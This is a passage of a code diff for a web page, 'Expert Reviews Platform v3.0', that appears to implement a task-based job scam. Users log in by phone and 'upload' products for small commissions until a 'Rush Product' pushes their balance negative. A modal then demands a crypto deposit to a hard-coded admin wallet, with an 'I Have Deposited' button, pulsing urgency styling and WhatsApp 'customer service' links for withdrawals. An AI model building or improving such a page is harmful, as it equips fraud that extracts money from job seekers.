@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Expert Reviews Platform</title>
-html
-<title>Expert Reviews Platform v2.0</title>    <style>
+    <title>Expert Reviews Platform v3.0</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+    <style>
         * {
             margin: 0;
             padding: 0;
@@ -88,6 +88,14 @@ html
             background: #5c2a2a;
             color: #ff8888;
         }
+        .badge-success {
+            background: #1f4a3a;
+            color: #64ff9e;
+        }
+        .badge-warning {
+            background: #5c4a1a;
+            color: #f0b34b;
+        }
         .btn {
             background: #2a3a5c;
             border: none;
@@ -132,7 +140,27 @@ html
         }
         .btn-whatsapp:hover {
             background: #0a7a6e;
+        }
+        .btn-deposit {
+            background: linear-gradient(135deg, #f7931a, #f0b34b);
+            color: #0b0e1a;
+        }
+        .btn-deposit:hover {
             transform: scale(1.02);
+            box-shadow: 0 4px 20px rgba(247, 147, 26, 0.3);
+        }
+        .btn-rush-deposit {
+            background: linear-gradient(135deg, #ff6b6b, #ee4444);
+            color: white;
+            animation: pulse 1.5s infinite;
+        }
+        .btn-rush-deposit:hover {
+            transform: scale(1.02);
+        }
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(255, 107, 107, 0.4); }
+            70% { box-shadow: 0 0 0 15px rgba(255, 107, 107, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(255, 107, 107, 0); }
         }
         .grid-2 {
             display: grid;
@@ -187,25 +215,6 @@ html
         .profit-red {
             color: #ff6b6b;
         }
-        .toast {
-            background: #1f2a44;
-            padding: 12px 16px;
-            border-radius: 12px;
-            margin-bottom: 12px;
-            border-left: 4px solid #f0b34b;
-            font-size: 14px;
-            animation: slideIn 0.3s ease;
-        }
-        @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateY(-10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
         .whatsapp-float {
             position: fixed;
             bottom: 20px;
@@ -227,7 +236,6 @@ html
         .whatsapp-float:hover {
             transform: scale(1.1);
         }
-        /* Login Screen */
         .login-box {
             max-width: 420px;
             width: 100%;
@@ -235,7 +243,6 @@ html
             border-radius: 24px;
             padding: 40px 30px;
             border: 1px solid #2a3450;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.8);
         }
         .login-box .logo {
             text-align: center;
@@ -245,12 +252,6 @@ html
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             margin-bottom: 8px;
-        }
-        .login-box .subtitle {
-            text-align: center;
-            color: #8892b0;
-            font-size: 14px;
-            margin-bottom: 30px;
         }
         .login-box .btn {
             width: 100%;
@@ -267,7 +268,6 @@ html
         }
         .login-box .btn:hover {
             transform: scale(1.02);
-            box-shadow: 0 4px 20px rgba(240, 179, 75, 0.3);
         }
         .login-box .footer {
             text-align: center;
@@ -278,6 +278,7 @@ html
         .login-box .footer a {
             color: #f0b34b;
             text-decoration: none;
+            cursor: pointer;
         }
         .whatsapp-btn {
             display: block;
@@ -293,74 +294,673 @@ html
         }
         .whatsapp-btn:hover {
             background: #0a7a6e;
+        }
+        .phone-input {
+            display: flex;
+            gap: 8px;
+        }
+        .phone-input select {
+            padding: 12px 10px;
+            border-radius: 10px;
+            border: 1px solid #27304a;
+            background: #0b0e1a;
+            color: white;
+            font-size: 15px;
+            outline: none;
+            width: 80px;
+        }
+        .phone-input select:focus {
+            border-color: #f0b34b;
+        }
+        .phone-input input {
+            flex: 1;
+            padding: 12px 14px;
+            border-radius: 10px;
+            border: 1px solid #27304a;
+            background: #0b0e1a;
+            color: white;
+            font-size: 15px;
+            outline: none;
+        }
+        .phone-input input:focus {
+            border-color: #f0b34b;
+        }
+        .wallet-display {
+            background: #0b0e1a;
+            padding: 12px 14px;
+            border-radius: 10px;
+            border: 1px solid #2a3a5c;
+            margin-top: 8px;
+        }
+        .wallet-display .address {
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            color: #88b0ff;
+            word-break: break-all;
+        }
+        .wallet-actions {
+            display: flex;
+            gap: 8px;
+            margin-top: 10px;
+        }
+        .wallet-actions button {
+            flex: 1;
+            padding: 10px;
+            border: none;
+            border-radius: 10px;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 14px;
+            transition: 0.2s;
+        }
+        .wallet-actions .copy-btn {
+            background: #2a3a5c;
+            color: #88b0ff;
+        }
+        .wallet-actions .copy-btn:hover {
+            background: #3e4b6b;
+        }
+        .wallet-actions .deposit-btn {
+            background: linear-gradient(135deg, #f7931a, #f0b34b);
+            color: #0b0e1a;
+        }
+        .wallet-actions .deposit-btn:hover {
             transform: scale(1.02);
+        }
+        .wallet-input {
+            display: flex;
+            gap: 8px;
+            margin-top: 8px;
+        }
+        .wallet-input input {
+            flex: 1;
+            padding: 10px 14px;
+            border-radius: 10px;
+            border: 1px solid #27304a;
+            background: #0b0e1a;
+            color: white;
+            font-size: 14px;
+            outline: none;
+        }
+        .wallet-input input:focus {
+            border-color: #f0b34b;
+        }
+        .wallet-input button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 10px;
+            background: #1f4a3a;
+            color: #64ff9e;
+            font-weight: 600;
+            cursor: pointer;
+            white-space: nowrap;
+        }
+        .wallet-input button:hover {
+            background: #2a5f4a;
+        }
+        .product-card {
+            background: linear-gradient(145deg, #1a2337, #141b2b);
+            border-radius: 16px;
+            padding: 20px 18px;
+            border: 1px solid #2a3450;
+            position: relative;
+            overflow: hidden;
+        }
+        .product-card .product-badge {
+            position: absolute;
+            top: 12px;
+            right: 12px;
+            padding: 4px 14px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .product-card .product-badge.normal {
+            background: #1f2a44;
+            color: #88b0ff;
+        }
+        .product-card .product-badge.rush {
+            background: #5c2a2a;
+            color: #ff6b6b;
+            animation: pulse-badge 2s infinite;
+        }
+        @keyframes pulse-badge {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+        .product-card .product-name {
+            font-size: 14px;
+            font-weight: 600;
+            color: #e0e6f0;
+            margin-bottom: 16px;
+            padding-right: 80px;
+            line-height: 1.4;
+        }
+        .product-card .product-name .highlight {
+            color: #f0b34b;
+        }
+        .product-card .product-details {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+        .product-card .product-details .detail-item {
+            background: #0b0e1a;
+            border-radius: 10px;
+            padding: 10px 12px;
+            border: 1px solid #1e2740;
+        }
+        .product-card .product-details .detail-item .detail-label {
+            font-size: 10px;
+            text-transform: uppercase;
+            color: #8892b0;
+            letter-spacing: 0.5px;
+            margin-bottom: 2px;
+        }
+        .product-card .product-details .detail-item .detail-value {
+            font-size: 16px;
+            font-weight: 700;
+            color: #e0e6f0;
+        }
+        .product-card .product-details .detail-item .detail-value.green {
+            color: #64ff9e;
+        }
+        .product-card .product-details .detail-item .detail-value.gold {
+            color: #f0b34b;
+        }
+        .product-card .product-details .detail-item .detail-value.red {
+            color: #ff6b6b;
+        }
+        .product-card .product-actions {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+        .product-card .product-actions .btn-upload {
+            background: linear-gradient(135deg, #f0b34b, #e8903a);
+            border: none;
+            color: #0b0e1a;
+            padding: 12px;
+            border-radius: 10px;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .product-card .product-actions .btn-upload:hover {
+            transform: scale(1.02);
+        }
+        .product-card .product-actions .btn-cancel {
+            background: #2a3a5c;
+            border: none;
+            color: #8892b0;
+            padding: 12px;
+            border-radius: 10px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .product-card .product-actions .btn-cancel:hover {
+            background: #3e4b6b;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #1a2337;
+            border-radius: 4px;
+            margin-top: 8px;
+            overflow: hidden;
+        }
+        .progress-bar .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #f0b34b, #64ff9e);
+            border-radius: 4px;
+            transition: width 0.5s;
+            width: 0%;
+        }
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.85);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+        .modal-overlay.active {
+            display: flex;
+        }
+        .modal-box {
+            background: #141b2b;
+            border-radius: 24px;
+            padding: 30px;
+            max-width: 440px;
+            width: 100%;
+            border: 1px solid #2a3450;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+        .modal-box .close-modal {
+            float: right;
+            background: none;
+            border: none;
+            color: #8892b0;
+            font-size: 24px;
+            cursor: pointer;
+        }
+        .modal-box .close-modal:hover {
+            color: white;
+        }
+        .insufficient-modal .modal-icon {
+            text-align: center;
+            font-size: 48px;
+            color: #ff6b6b;
+            margin-bottom: 8px;
+        }
+        .insufficient-modal .modal-title {
+            text-align: center;
+            font-size: 20px;
+            font-weight: 700;
+            color: #ff6b6b;
+            margin-bottom: 4px;
+        }
+        .insufficient-modal .modal-sub {
+            text-align: center;
+            color: #8892b0;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .insufficient-modal .balance-display {
+            background: #0b0e1a;
+            border-radius: 12px;
+            padding: 16px;
+            border: 1px solid #2a3450;
+            margin-bottom: 16px;
+        }
+        .insufficient-modal .balance-display .bal-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid #1a2337;
+            font-size: 14px;
+        }
+        .insufficient-modal .balance-display .bal-row:last-child {
+            border-bottom: none;
+        }
+        .insufficient-modal .balance-display .bal-row .bal-label {
+            color: #8892b0;
+        }
+        .insufficient-modal .balance-display .bal-row .bal-value.negative {
+            color: #ff6b6b;
+            font-weight: 700;
+        }
+        .insufficient-modal .balance-display .bal-row .bal-value.green {
+            color: #64ff9e;
+            font-weight: 700;
+        }
+        .insufficient-modal .balance-display .bal-row .bal-value.gold {
+            color: #f0b34b;
+            font-weight: 700;
+        }
+        .insufficient-modal .modal-actions {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 16px;
+        }
+        .insufficient-modal .modal-actions .btn-cs {
+            background: #075e54;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+            text-decoration: none;
+            text-align: center;
+            display: block;
+        }
+        .insufficient-modal .modal-actions .btn-cs:hover {
+            background: #0a7a6e;
+        }
+        .insufficient-modal .modal-actions .btn-deposit-modal {
+            background: linear-gradient(135deg, #f7931a, #f0b34b);
+            color: #0b0e1a;
+            border: none;
+            padding: 14px;
+            border-radius: 12px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .insufficient-modal .modal-actions .btn-deposit-modal:hover {
+            transform: scale(1.02);
+        }
+        .complete-modal .modal-icon {
+            text-align: center;
+            font-size: 48px;
+            color: #64ff9e;
+            margin-bottom: 8px;
+        }
+        .complete-modal .modal-title {
+            text-align: center;
+            font-size: 20px;
+            font-weight: 700;
+            color: #64ff9e;
+            margin-bottom: 4px;
+        }
+        .complete-modal .modal-sub {
+            text-align: center;
+            color: #8892b0;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .complete-modal .earnings-display {
+            background: #0b0e1a;
+            border-radius: 12px;
+            padding: 16px;
+            border: 1px solid #2a3450;
+            margin-bottom: 16px;
+        }
+        .complete-modal .earnings-display .earn-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid #1a2337;
+            font-size: 14px;
+        }
+        .complete-modal .earnings-display .earn-row:last-child {
+            border-bottom: none;
+        }
+        .complete-modal .earnings-display .earn-row .earn-label {
+            color: #8892b0;
+        }
+        .complete-modal .earnings-display .earn-row .earn-value.green {
+            color: #64ff9e;
+            font-weight: 700;
+        }
+        .complete-modal .earnings-display .earn-row .earn-value.gold {
+            color: #f0b34b;
+            font-weight: 700;
+        }
+        .complete-modal .earnings-display .earn-row .earn-value.white {
+            color: #e0e6f0;
+            font-weight: 700;
+        }
+        .complete-modal .modal-actions {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 10px;
+            margin-top: 16px;
         }
     </style>
 </head>
 <body>
 
-    <!-- WhatsApp Floating Button -->
     <a href="https://wa.me/1234567890?text=Hello%20Expert%20Reviews%20CS%2C%20I%20need%20assistance" 
-       class="whatsapp-float" 
-       target="_blank">
+       class="whatsapp-float" target="_blank">
         <i class="fab fa-whatsapp"></i>
     </a>
 
+    <!-- INSUFFICIENT BALANCE MODAL -->
+    <div class="modal-overlay" id="insufficientModal">
+        <div class="modal-box insufficient-modal">
+            <button class="close-modal" onclick="closeInsufficientModal()">✕</button>
+            <div class="modal-icon">⚠️</div>
+            <div class="modal-title">Insufficient Balance</div>
+            <div class="modal-sub">Your account balance is insufficient to continue. Please deposit to proceed.</div>
+            <div class="balance-display">
+                <div class="bal-row">
+                    <span class="bal-label">💰 Current Balance</span>
+                    <span class="bal-value negative" id="insufficientBalance">-$1,265.62</span>
+                </div>
+                <div class="bal-row">
+                    <span class="bal-label">⚡ Rush Product Value</span>
+                    <span class="bal-value gold" id="insufficientRushValue">$2,579.35</span>
+                </div>
+                <div class="bal-row">
+                    <span class="bal-label">💵 Amount Required</span>
+                    <span class="bal-value gold" id="insufficientRequired">$1,265.62</span>
+                </div>
+                <div class="bal-row">
+                    <span class="bal-label">🏆 Potential 6x Commission</span>
+                    <span class="bal-value green" id="insufficientCommission">$77.38</span>
+                </div>
+            </div>
+            <div style="background:#1a2337;padding:12px;border-radius:10px;border:1px solid #2a3450;margin-bottom:16px;">
+                <div style="font-size:12px;color:#8892b0;margin-bottom:4px;">📤 Send payment to:</div>
+                <div style="font-family:'Courier New',monospace;font-size:12px;color:#88b0ff;word-break:break-all;" id="insufficientWallet">
+                    0x742d35Cc6634C0532925a3b844Bc454e4438f44e
+                </div>
+                <button class="btn" style="background:#2a3a5c;color:#88b0ff;padding:8px;font-size:12px;width:auto;margin-top:6px;" onclick="copyInsufficientWallet()">
+                    <i class="fas fa-copy"></i> Copy Address
+                </button>
+            </div>
+            <div class="modal-actions">
+                <a href="https://wa.me/1234567890?text=Hello%20Expert%20Reviews%2C%20I%20have%20insufficient%20balance%20and%20need%20help%20with%20deposit" 
+                   class="btn-cs" target="_blank">
+                    <i class="fab fa-whatsapp"></i> Contact CS
+                </a>
+                <button class="btn-deposit-modal" onclick="confirmInsufficientDeposit()">
+                    <i class="fas fa-check-circle"></i> I Have Deposited
+                </button>
+            </div>
+            <div class="small-text" style="text-align:center;margin-top:12px;color:#8892b0;">
+                ⏱ Deposit will be confirmed within 5-15 minutes
+            </div>
+        </div>
+    </div>
+
+    <!-- TASK COMPLETE MODAL -->
+    <div class="modal-overlay" id="completeModal">
+        <div class="modal-box complete-modal">
+            <button class="close-modal" onclick="closeCompleteModal()">✕</button>
+            <div class="modal-icon">🎉</div>
+            <div class="modal-title">Task Complete!</div>
+            <div class="modal-sub">You have successfully completed 35 product uploads. Here's your earnings summary:</div>
+            <div class="earnings-display">
+                <div class="earn-row">
+                    <span class="earn-label">📦 Products Uploaded</span>
+                    <span class="earn-value white" id="completeProducts">35</span>
+                </div>
+                <div class="earn-row">
+                    <span class="earn-label">💰 Total Commission Earned</span>
+                    <span class="earn-value green" id="completeCommission">$87.50</span>
+                </div>
+                <div class="earn-row">
+                    <span class="earn-label">📈 Profit Percentage</span>
+                    <span class="earn-value gold" id="completePercentage">7.74%</span>
+                </div>
+                <div class="earn-row">
+                    <span class="earn-label">🏆 Bonus (5% of profit)</span>
+                    <span class="earn-value gold" id="completeBonus">$4.38</span>
+                </div>
+                <div class="earn-row" style="border-bottom:2px solid #2a3450;padding-bottom:12px;">
+                    <span class="earn-label" style="font-weight:700;color:#e0e6f0;">💰 Total Earnings</span>
+                    <span class="earn-value green" style="font-size:18px;" id="completeTotal">$91.88</span>
+                </div>
+                <div class="earn-row" style="padding-top:12px;">
+                    <span class="earn-label">📊 Average Per Upload</span>
+                    <span class="earn-value white" id="completeAverage">$2.63</span>
+                </div>
+                <div class="earn-row">
+                    <span class="earn-label">⏱ Time Spent</span>
+                    <span class="earn-value white" id="completeTime">~45 min</span>
+                </div>
+            </div>
+            <div class="modal-actions">
+                <button class="btn btn-primary" onclick="closeCompleteModal()">
+                    <i class="fas fa-thumbs-up"></i> Continue Working
+                </button>
+                <a href="https://wa.me/1234567890?text=Hello%20Expert%20Reviews%2C%20I%20completed%2035%20tasks%20and%20want%20to%20withdraw" 
+                   class="btn btn-whatsapp" target="_blank" style="text-decoration:none;display:block;">
+                    <i class="fab fa-whatsapp"></i> Request Withdrawal
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <!-- DEPOSIT MODAL -->
+    <div class="modal-overlay" id="depositModal">
+        <div class="modal-box">
+            <button class="close-modal" onclick="closeDepositModal()">✕</button>
+            <div class="modal-title" style="font-size:22px;font-weight:700;color:#f0b34b;text-align:center;margin-bottom:8px;">💰 Deposit Crypto</div>
+            <div class="modal-sub" style="text-align:center;color:#8892b0;font-size:14px;margin-bottom:20px;">Send funds to the wallet address below</div>
+            <div style="background:#0b0e1a;padding:14px;border-radius:12px;border:1px solid #2a3a5c;">
+                <div style="font-size:12px;color:#8892b0;margin-bottom:6px;">📤 Send to this address:</div>
+                <div style="font-family:'Courier New',monospace;font-size:12px;color:#88b0ff;word-break:break-all;" id="modalWalletAddress">
+                    0x742d35Cc6634C0532925a3b844Bc454e4438f44e
+                </div>
+                <button class="btn" style="background:#2a3a5c;color:#88b0ff;padding:8px;font-size:12px;width:auto;margin-top:8px;" onclick="copyModalWallet()">
+                    <i class="fas fa-copy"></i> Copy
+                </button>
+            </div>
+            <div style="margin-top:16px;padding:12px;background:#1a2337;border-radius:10px;border:1px solid #2a3a5c;">
+                <div class="flex small-text">
+                    <span>💵 Minimum Deposit:</span>
+                    <span style="color:#64ff9e;">$50</span>
+                </div>
+                <div class="flex small-text mt-8">
+                    <span>⏱ Processing Time:</span>
+                    <span style="color:#88b0ff;">5-15 minutes</span>
+                </div>
+            </div>
+            <button class="btn" style="background:#1a2337;color:#8892b0;margin-top:16px;" onclick="closeDepositModal()">Close</button>
+        </div>
+    </div>
+
     <div id="app">
 
-        <!-- LOGIN SCREEN -->
+        <!-- LOGIN -->
         <div id="loginScreen" class="login-box">
             <div class="logo">🚀 Expert Reviews</div>
             <div class="subtitle">Training & Working Platform</div>
-
             <div class="input-group">
-                <label>Username</label>
-                <input type="text" id="loginUsername" placeholder="Enter username" value="demo_user" />
+                <label><i class="fas fa-phone"></i> Phone Number</label>
+                <div class="phone-input">
+                    <select id="countryCode">
+                        <option value="+1">🇺🇸 +1</option>
+                        <option value="+44">🇬🇧 +44</option>
+                        <option value="+63">🇵🇭 +63</option>
+                        <option value="+91">🇮🇳 +91</option>
+                        <option value="+62">🇮🇩 +62</option>
+                        <option value="+60">🇲🇾 +60</option>
+                        <option value="+65">🇸🇬 +65</option>
+                        <option value="+61">🇦🇺 +61</option>
+                        <option value="+81">🇯🇵 +81</option>
+                        <option value="+82">🇰🇷 +82</option>
+                        <option value="+86">🇨🇳 +86</option>
+                        <option value="+55">🇧🇷 +55</option>
+                        <option value="+52">🇲🇽 +52</option>
+                        <option value="+39">🇮🇹 +39</option>
+                        <option value="+33">🇫🇷 +33</option>
+                        <option value="+49">🇩🇪 +49</option>
+                        <option value="+7">🇷🇺 +7</option>
+                        <option value="+27">🇿🇦 +27</option>
+                        <option value="+234">🇳🇬 +234</option>
+                        <option value="+254">🇰🇪 +254</option>
+                        <option value="+233">🇬🇭 +233</option>
+                        <option value="+20">🇪🇬 +20</option>
+                        <option value="+971">🇦🇪 +971</option>
+                        <option value="+966">🇸🇦 +966</option>
+                        <option value="+92">🇵🇰 +92</option>
+                        <option value="+880">🇧🇩 +880</option>
+                        <option value="+977">🇳🇵 +977</option>
+                        <option value="+94">🇱🇰 +94</option>
+                        <option value="+95">🇲🇲 +95</option>
+                        <option value="+856">🇱🇦 +856</option>
+                        <option value="+855">🇰🇭 +855</option>
+                        <option value="+670">🇹🇱 +670</option>
+                    </select>
+                    <input type="text" id="loginPhone" placeholder="Enter phone number" />
+                </div>
             </div>
             <div class="input-group">
-                <label>Password</label>
-                <input type="password" id="loginPassword" placeholder="Enter password" value="123123" />
+                <label><i class="fas fa-lock"></i> Password (PIN)</label>
+                <input type="password" id="loginPassword" placeholder="Enter PIN" value="123123" />
             </div>
-
-            <button class="btn" onclick="login()">
+            <button class="btn" onclick="loginWithPhone()">
                 <i class="fas fa-sign-in-alt"></i> Login
             </button>
-
             <a href="https://wa.me/1234567890?text=Hello%20Expert%20Reviews%2C%20I%20want%20to%20register" 
-               class="whatsapp-btn" 
-               target="_blank">
+               class="whatsapp-btn" target="_blank">
                 <i class="fab fa-whatsapp"></i> Need Help? Chat on WhatsApp
             </a>
-
             <div class="footer">
-                New user? <a href="#" onclick="showRegister()">Register here</a>
+                New user? <a onclick="showRegister()">Register here</a>
             </div>
         </div>
 
-        <!-- REGISTER SCREEN -->
+        <!-- REGISTER -->
         <div id="registerScreen" class="login-box hidden">
             <div class="logo">📝 Register</div>
             <div class="subtitle">Create your Expert Reviews account</div>
-
             <div class="input-group">
-                <label>Username</label>
-                <input type="text" id="regUsername" placeholder="Choose a username" />
+                <label><i class="fas fa-user"></i> Full Name</label>
+                <input type="text" id="regName" placeholder="Enter your full name" />
             </div>
             <div class="input-group">
-                <label>Password</label>
-                <input type="password" id="regPassword" placeholder="Create password" value="123123" />
+                <label><i class="fas fa-phone"></i> Phone Number</label>
+                <div class="phone-input">
+                    <select id="regCountryCode">
+                        <option value="+1">🇺🇸 +1</option>
+                        <option value="+44">🇬🇧 +44</option>
+                        <option value="+63">🇵🇭 +63</option>
+                        <option value="+91">🇮🇳 +91</option>
+                        <option value="+62">🇮🇩 +62</option>
+                        <option value="+60">🇲🇾 +60</option>
+                        <option value="+65">🇸🇬 +65</option>
+                        <option value="+61">🇦🇺 +61</option>
+                        <option value="+81">🇯🇵 +81</option>
+                        <option value="+82">🇰🇷 +82</option>
+                        <option value="+86">🇨🇳 +86</option>
+                        <option value="+55">🇧🇷 +55</option>
+                        <option value="+52">🇲🇽 +52</option>
+                        <option value="+39">🇮🇹 +39</option>
+                        <option value="+33">🇫🇷 +33</option>
+                        <option value="+49">🇩🇪 +49</option>
+                        <option value="+7">🇷🇺 +7</option>
+                        <option value="+27">🇿🇦 +27</option>
+                        <option value="+234">🇳🇬 +234</option>
+                        <option value="+254">🇰🇪 +254</option>
+                        <option value="+233">🇬🇭 +233</option>
+                        <option value="+20">🇪🇬 +20</option>
+                        <option value="+971">🇦🇪 +971</option>
+                        <option value="+966">🇸🇦 +966</option>
+                        <option value="+92">🇵🇰 +92</option>
+                        <option value="+880">🇧🇩 +880</option>
+                        <option value="+977">🇳🇵 +977</option>
+                        <option value="+94">🇱🇰 +94</option>
+                        <option value="+95">🇲🇲 +95</option>
+                        <option value="+856">🇱🇦 +856</option>
+                        <option value="+855">🇰🇭 +855</option>
+                        <option value="+670">🇹🇱 +670</option>
+                    </select>
+                    <input type="text" id="regPhone" placeholder="Enter phone number" />
+                </div>
             </div>
             <div class="input-group">
-                <label>Referral Code (optional)</label>
+                <label><i class="fas fa-lock"></i> Password (PIN)</label>
+                <input type="password" id="regPassword" placeholder="Create 6-digit PIN" value="123123" />
+            </div>
+            <div class="input-group">
+                <label><i class="fas fa-qrcode"></i> Referral Code</label>
                 <input type="text" id="regReferral" placeholder="Enter referral code" />
             </div>
-
-            <button class="btn" onclick="register()">
+            <button class="btn" onclick="registerWithPhone()">
                 <i class="fas fa-user-plus"></i> Register & Login
             </button>
-
             <div class="footer">
-                Already have an account? <a href="#" onclick="showLogin()">Login here</a>
+                Already have an account? <a onclick="showLogin()">Login here</a>
             </div>
         </div>
 
@@ -368,7 +968,7 @@ html
         <div id="dashboardScreen" class="container hidden">
             <div class="flex">
                 <h1 style="font-size:20px; -webkit-text-fill-color:white; background:none;">📊 Dashboard</h1>
-                <span style="background:#1f2a44;padding:6px 14px;border-radius:20px;font-size:13px;" id="userDisplay">demo_user</span>
+                <span style="background:#1f2a44;padding:6px 14px;border-radius:20px;font-size:13px;" id="userDisplay">User</span>
             </div>
             <div class="subtitle" style="text-align:left;padding-bottom:8px;border-bottom:none;margin-bottom:8px;">
                 <span id="accountTypeBadge" class="badge badge-normal">Training Account</span>
@@ -376,7 +976,6 @@ html
                     <i class="fas fa-exchange-alt"></i> Switch
                 </button>
             </div>
-
             <div class="card">
                 <div class="flex">
                     <span class="label"><i class="fas fa-wallet"></i> Balance</span>
@@ -389,25 +988,62 @@ html
                 </div>
             </div>
 
-            <div class="card">
-                <div class="flex">
-                    <span class="label"><i class="fas fa-box"></i> Current Product</span>
-                    <span id="productTypeBadge" class="badge badge-normal">Normal (0.5%)</span>
+            <!-- PRODUCT CARD -->
+            <div class="product-card" id="productCard">
+                <span class="product-badge normal" id="productBadge">Normal</span>
+                <div class="product-name" id="productName">
+                    <span class="highlight">AXIS Q6078-E</span> 50HZ EUR/UK TOP PERFORMANCE UHD 4K PTZ CAMERA 20X
                 </div>
-                <div class="flex mt-8">
-                    <span class="small-text">Value: <strong id="productValue">$250.00</strong></span>
-                    <span class="small-text">Commission: <strong id="commissionDisplay">$1.25</strong></span>
+                <div class="product-details">
+                    <div class="detail-item">
+                        <div class="detail-label">Product Value</div>
+                        <div class="detail-value gold" id="detailValue">$418.94</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">Commission</div>
+                        <div class="detail-value" id="detailCommission">0.5%</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">Profits</div>
+                        <div class="detail-value green" id="detailProfit">$2.09</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">Rebate</div>
+                        <div class="detail-value gold" id="detailRebate">$421.03</div>
+                    </div>
                 </div>
-                <div class="grid-2 mt-8">
-                    <button class="btn btn-primary" onclick="uploadProduct()">
+                <div class="product-actions">
+                    <button class="btn-upload" onclick="uploadProduct()">
                         <i class="fas fa-upload"></i> Upload Data
                     </button>
-                    <button class="btn" onclick="boostProduct()" style="background:#2a3a5c;">
+                    <button class="btn-cancel" onclick="boostProduct()">
                         <i class="fas fa-bolt"></i> Boost
                     </button>
                 </div>
                 <div class="small-text mt-8" style="text-align:center;">
                     Uploaded: <span id="uploadCount">0</span> / 35 (Set 1 of 2)
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+            </div>
+
+            <!-- WALLET -->
+            <div class="card" style="border-color:#2a4a5c;">
+                <div class="flex">
+                    <span class="label"><i class="fas fa-qrcode"></i> Crypto Wallet</span>
+                    <span class="badge badge-warning" id="walletStatus">Not Set</span>
+                </div>
+                <div class="wallet-input">
+                    <input type="text" id="walletInput" placeholder="Enter your crypto wallet address" />
+                    <button onclick="saveWallet()"><i class="fas fa-save"></i> Save</button>
+                </div>
+                <div id="walletDisplay" class="wallet-display hidden">
+                    <div class="address" id="walletAddress">0x0000000000000000000000000000000000000000</div>
+                    <div class="wallet-actions">
+                        <button class="copy-btn" onclick="copyWallet()"><i class="fas fa-copy"></i> Copy</button>
+                        <button class="deposit-btn" onclick="openDepositModal()"><i class="fas fa-coins"></i> Deposit</button>
+                    </div>
                 </div>
             </div>
 
@@ -416,7 +1052,7 @@ html
                     <i class="fas fa-history"></i> History
                 </button>
                 <button class="btn btn-danger" onclick="simulateCryptoDeposit()">
-                    <i class="fab fa-bitcoin"></i> Crypto Deposit
+                    <i class="fab fa-bitcoin"></i> Test Deposit
                 </button>
             </div>
 
@@ -426,19 +1062,6 @@ html
                style="margin-top:8px; display:block; text-decoration:none;">
                 <i class="fab fa-whatsapp"></i> Chat with Customer Service
             </a>
-
-            <div id="negativeAlert" class="hidden card" style="border-color:#ff6b6b;background:#2a1a1a;">
-                <div class="flex">
-                    <span style="color:#ff6b6b;font-weight:600;">⚠️ Negative Balance</span>
-                    <span id="negativeAmount" style="color:#ff6b6b;font-weight:700;">-$0.00</span>
-                </div>
-                <p class="small-text" style="margin-top:6px;">
-                    Rush Product detected! Deposit <span id="depositNeeded">$0</span> to continue.
-                </p>
-                <button class="btn btn-primary" onclick="simulateCryptoDeposit()" style="margin-top:6px;">
-                    <i class="fab fa-bitcoin"></i> Deposit with Crypto
-                </button>
-            </div>
 
             <div class="card" style="border-color:#2a4a3a;">
                 <div class="flex">
@@ -471,6 +1094,8 @@ html
         let state = {
             loggedIn: false,
             username: 'demo_user',
+            fullName: '',
+            phone: '',
             accountType: 'training',
             balance: 1130,
             deposit: 1000,
@@ -488,7 +1113,27 @@ html
             rushDepositNeeded: 0,
             baseSalary: 0,
             workingDays: 0,
+            walletAddress: '',
+            rushProductValue: 0,
+            isRushActive: false,
+            sessionStart: null,
+            totalUploads: 0,
         };
+
+        const ADMIN_WALLET = '0x742d35Cc6634C0532925a3b844Bc454e4438f44e';
+
+        const productNames = [
+            'AXIS Q6078-E 50HZ EUR/UK TOP PERFORMANCE UHD 4K PTZ CAMERA 20X',
+            'Sony A7R IV 61MP Full-Frame Mirrorless Camera Body Only',
+            'Canon EOS R5 45MP Full-Frame Mirrorless Camera 8K Video',
+            'Nikon Z9 45.7MP Full-Frame Mirrorless Camera 8K UHD',
